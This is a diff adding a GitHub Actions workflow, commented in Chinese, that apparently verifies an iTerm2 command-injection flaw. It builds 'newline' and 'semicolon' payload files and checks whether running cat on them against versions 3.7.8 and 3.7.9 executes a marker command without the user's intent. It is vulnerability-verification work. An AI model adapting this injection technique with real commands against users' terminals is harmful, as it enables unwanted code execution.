@@ -1,0 +1,329 @@
+name: macos-verify
+
+# push 和手动都能触发
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-verify.yml'
+      - 'tools/**'
+  workflow_dispatch:
+
+jobs:
+
+  # ==========================================================
+  # 对照 1：iTerm2 3.7.8 + 换行 payload
+  # 预期：中招（不带回车）。证明测试台本身是有效的。
+  # ==========================================================
+  control-378:
+    runs-on: macos-14
+    timeout-minutes: 30
+    env:
+      ITERM_VER: "3_7_8"
+      MODE: "newline"
+      MARKER: "PWNED_378_NEWLINE"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "console user: $(stat -f%Su /dev/console)"
+          pgrep -l WindowServer || echo "NO WindowServer"
+
+      - name: Download iTerm2 ${{ env.ITERM_VER }}
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip \
+            "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          ls -la /tmp/i.zip
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" \
+            /tmp/i/iTerm.app/Contents/Info.plist
+
+      - name: Build payload (${{ env.MODE }})
+        run: |
+          set -eux
+          CMD="touch \$HOME/${MARKER}"
+          python3 tools/make_payload.py \
+            --mode "$MODE" --cmd "$CMD" --out /tmp/payload.md
+          echo "--- od ---"
+          od -c /tmp/payload.md | head -20
+
+      - name: Clean markers
+        run: rm -f "$HOME/$MARKER" /tmp/x
+
+      - name: Launch iTerm2
+        run: |
+          set -x
+          open -a /tmp/i/iTerm.app
+          sleep 15
+          pgrep -l iTerm || echo "ITERM NOT RUNNING"
+          osascript -e 'tell application "System Events" to get name of every process whose background only is false' 2>&1 || true
+
+      - name: Drive cat
+        run: |
+          set -x
+          cat > /tmp/step1.scpt <<'SCPT'
+          tell application "iTerm2"
+            activate
+            delay 2
+            set w to (create window with default profile)
+            delay 3
+            tell current session of w
+              write text "cat /tmp/payload.md"
+            end tell
+            delay 8
+          end tell
+          SCPT
+          osascript /tmp/step1.scpt 2>&1 || echo "osascript step1 failed"
+          sleep 8
+
+      - name: Check result
+        if: always()
+        run: |
+          echo "=============== RESULT (control-378) ==============="
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE - marker created without Enter"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+          echo "--- home ---"
+          ls -lat "$HOME" | head -15
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: evidence-control-378
+          path: |
+            /tmp/payload.md
+            /tmp/shot.png
+          if-no-files-found: warn
+
+  # ==========================================================
+  # 对照 2：iTerm2 3.7.9 + 换行 payload
+  # 预期：不中招。证明 3.7.9 的清洗确实把换行堵了。
+  # ==========================================================
+  neg-379-newline:
+    runs-on: macos-14
+    timeout-minutes: 30
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "newline"
+      MARKER: "PWNED_379_NEWLINE"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          pgrep -l WindowServer || echo "NO WindowServer"
+
+      - name: Download iTerm2 ${{ env.ITERM_VER }}
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip \
+            "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" \
+            /tmp/i/iTerm.app/Contents/Info.plist
+
+      - name: Build payload (${{ env.MODE }})
+        run: |
+          set -eux
+          CMD="touch \$HOME/${MARKER}"
+          python3 tools/make_payload.py \
+            --mode "$MODE" --cmd "$CMD" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -20
+
+      - name: Clean markers
+        run: rm -f "$HOME/$MARKER" /tmp/x
+
+      - name: Launch iTerm2
+        run: |
+          open -a /tmp/i/iTerm.app
+          sleep 15
+          pgrep -l iTerm || echo "ITERM NOT RUNNING"
+
+      - name: Drive cat
+        run: |
+          cat > /tmp/step1.scpt <<'SCPT'
+          tell application "iTerm2"
+            activate
+            delay 2
+            set w to (create window with default profile)
+            delay 3
+            tell current session of w
+              write text "cat /tmp/payload.md"
+            end tell
+            delay 8
+          end tell
+          SCPT
+          osascript /tmp/step1.scpt 2>&1 || echo "osascript step1 failed"
+          sleep 8
+
+      - name: Check result
+        if: always()
+        run: |
+          echo "=============== RESULT (neg-379-newline) ==============="
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] UNEXPECTED - newline payload worked on 3.7.9"
+          else
+            echo "[RESULT] AS_EXPECTED - newline sanitized on 3.7.9"
+          fi
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: evidence-neg-379-newline
+          path: /tmp/payload.md
+          if-no-files-found: warn
+
+  # ==========================================================
+  # 被测目标：iTerm2 3.7.9 + 分号 payload
+  # 预期：cat 之后按回车 → 中招
+  # 两个阶段：
+  #   stage A  写 text ""（用户直接按回车）
+  #   stage B  写 text "echo hi"（用户敲下一条命令再回车）
+  # ==========================================================
+  test-379-semicolon:
+    runs-on: macos-14
+    timeout-minutes: 35
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "semicolon"
+      MARKER: "PWNED_379_SEMI"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          pgrep -l WindowServer || echo "NO WindowServer"
+
+      - name: Download iTerm2 ${{ env.ITERM_VER }}
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip \
+            "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" \
+            /tmp/i/iTerm.app/Contents/Info.plist
+
+      - name: Build payload (${{ env.MODE }})
+        run: |
+          set -eux
+          CMD="touch \$HOME/${MARKER}"
+          python3 tools/make_payload.py \
+            --mode "$MODE" --cmd "$CMD" --out /tmp/payload.md
+          echo "--- od ---"
+          od -c /tmp/payload.md | head -20
+
+      - name: Clean markers
+        run: rm -f "$HOME/$MARKER" /tmp/x
+
+      - name: Launch iTerm2
+        run: |
+          open -a /tmp/i/iTerm.app
+          sleep 15
+          pgrep -l iTerm || echo "ITERM NOT RUNNING"
+
+      - name: Cat payload
+        run: |
+          cat > /tmp/step1.scpt <<'SCPT'
+          tell application "iTerm2"
+            activate
+            delay 2
+            set w to (create window with default profile)
+            delay 3
+            tell current session of w
+              write text "cat /tmp/payload.md"
+            end tell
+            delay 8
+          end tell
+          SCPT
+          osascript /tmp/step1.scpt 2>&1 || echo "step1 failed"
+          sleep 8
+          echo "--- after cat ---"
+          ls -la "$HOME/$MARKER" 2>/dev/null || echo "marker absent (expected)"
+
+      - name: Stage A - bare Enter
+        run: |
+          cat > /tmp/step2.scpt <<'SCPT'
+          tell application "iTerm2"
+            tell current session of current window
+              write text ""
+            end tell
+            delay 6
+          end tell
+          SCPT
+          osascript /tmp/step2.scpt 2>&1 || echo "step2 failed"
+          sleep 6
+          echo "=== after bare Enter ==="
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[STAGE_A] VULNERABLE - bare Enter triggered it"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[STAGE_A] no trigger yet"
+          fi
+
+      - name: Stage B - typed next command then Enter
+        run: |
+          cat > /tmp/step3.scpt <<'SCPT'
+          tell application "iTerm2"
+            tell current session of current window
+              write text "echo hello_from_runner"
+            end tell
+            delay 6
+          end tell
+          SCPT
+          osascript /tmp/step3.scpt 2>&1 || echo "step3 failed"
+          sleep 6
+          echo "=== after typed command ==="
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[STAGE_B] VULNERABLE - typed command triggered it"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[STAGE_B] no trigger"
+          fi
+
+      - name: Final result
+        if: always()
+        run: |
+          echo "=============== FINAL (test-379-semicolon) ==============="
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: evidence-test-379-semicolon
+          path: |
+            /tmp/payload.md
+            /tmp/shot.png
+          if-no-files-found: warn
